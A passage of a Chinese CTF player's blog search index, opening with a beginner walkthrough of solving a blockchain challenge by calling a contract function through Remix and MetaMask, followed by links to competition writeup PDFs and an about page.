src="/images/记第一次上链/image-20240223010429906.png"alt="image-20240223010429906" /><figcaption aria-hidden="true">image-20240223010429906</figcaption></figure><h2 id="remix">remix</h2><p>新进一个test.sol文件，把得到的合约源码复制进去</p><figure><img src="/images/记第一次上链/image-20240223010958373.png"alt="image-20240223010958373" /><figcaption aria-hidden="true">image-20240223010958373</figcaption></figure><p>编译一下，注意compiler的版本，绿色的√出现即为编译成功</p><figure><img src="/images/记第一次上链/image-20240223011101264.png"alt="image-20240223011101264" /><figcaption aria-hidden="true">image-20240223011101264</figcaption></figure><p>在metamask上手动添加网络，网络名称随便写，RPC题目中的复制过来（记得加上http），链ID随便写，保存的时候它会教你做事，货币符号随便写</p><blockquote><p>由于之前做题的时候添加过了，这里有个报错</p></blockquote><p><img src="/images/记第一次上链/image-20240223011626597.png" alt="image-20240223011626597" style="zoom:50%;" /></p><p>在添加账户中导入账户，填写上面生成的账户的Private Key</p><p><img src="/images/记第一次上链/image-20240223011806125.png" alt="image-20240223011806125" style="zoom:50%;" /></p><p>开始将智能合约部署上链，ENVIRONMENT选Inject Provider -MetaMask，确保自己连入的是那个2024结尾的账户（点那个地球的标志查看），AtAddress填入合约地址，然后点一下AtAddress，给happyNewYear传一个Happy，然后点一下happyNewYear，确认交易，大功告成！</p><p><img src="/images/记第一次上链/image-20240223012042008.png" alt="image-20240223012042008" style="zoom:50%;" /></p><figure><img src="/images/记第一次上链/image-20240223012345867.png"alt="image-20240223012345867" /><figcaption aria-hidden="true">image-20240223012345867</figcaption></figure><p><img src="/images/记第一次上链/image-20240223012407277.png" alt="image-20240223012407277" style="zoom:50%;" /></p><p>nc一下查看3即可看到flag</p><figure><img src="/images/记第一次上链/image-20240223010429906.png"alt="image-20240223010429906" /><figcaption aria-hidden="true">image-20240223010429906</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF2024 Round3 Writeup</title>
      <link href="/posts/5a11c057/"/>
      <url>/posts/5a11c057/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/SICTF2024Writeup.pdf">Writeup点我</a></h4><p>Additional Statement:</p><p>"[签到]签到" and "WHO?WHO?WHO" in "Misc", "[Game][Battle City]" in"Reverse" ,and "Forensics" was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SICTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame2024 Writeup</title>
      <link href="/posts/d8633326/"/>
      <url>/posts/d8633326/</url>
      
        <content type="html"><![CDATA[<h4 id="week1-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week1_Writeup.pdf">Week1Writeup点我</a></h4><h4 id="week2-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week2_Writeup.pdf">Week2Writeup点我</a></h4><h4 id="week3-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week3_Writeup.pdf">Week3Writeup点我</a></h4><h4 id="week4-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week4_Writeup.pdf">Week4Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF2024 Writeup</title>
      <link href="/posts/fabac5e4/"/>
      <url>/posts/fabac5e4/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/BeginCTF2024_Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2023 Writeup</title>
      <link href="/posts/d40cd373/"/>
      <url>/posts/d40cd373/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/NCTF2023_Writeup.pdf">Writeup点我</a></h4><p>Additional Statement:</p><p>"Web" was written by <strong>wuming</strong></p><p>"Reverse" was written by <strong>fermata</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023 Writeup</title>
      <link href="/posts/58e12fb0/"/>
      <url>/posts/58e12fb0/</url>
      
        <content type="html"><![CDATA[<h4 id="week1-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week1_Writeup.pdf">Week1Writeup点我</a></h4><h4 id="week2-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week2_Writeup.pdf">Week2Writeup点我</a></h4><h4 id="week3-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week3_Writeup.pdf">Week3Writeup点我</a></h4><h4 id="week4-writeup点我"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week4_Writeup.pdf">Week4Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, world!</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>在下St4rr。</p><p>目前南邮大三在读，网安新手。</p><p>一个菜狗CTFer，misc手。</p><p>已加入CTF战队X1cT34m和Polaris，主要职责是给大佬们端茶。</p><p>努力学习中，争取不拖大佬们的后腿Orz。</p><p>这里是本菜狗的博客，技能有限，认识尚浅，如有问题欢迎指出 :)</p><p>有几篇博客是加密的，如想查看，可以联系我要密码()</p><p>联系方式：</p><p>QQ: 3092158216</p><p>邮箱：3092158216@qq.com</p><p>​ st4rr2333@gmail.com</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Comment</title>
      <link href="/comment/index.html"/>
      <url>/comment/index.html</url>
      
        <content type="html"><![CDATA[<h1 id="leave-anything-you-want-to-say-here-to-me">Leave anything youwant to say here to me!</h1>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
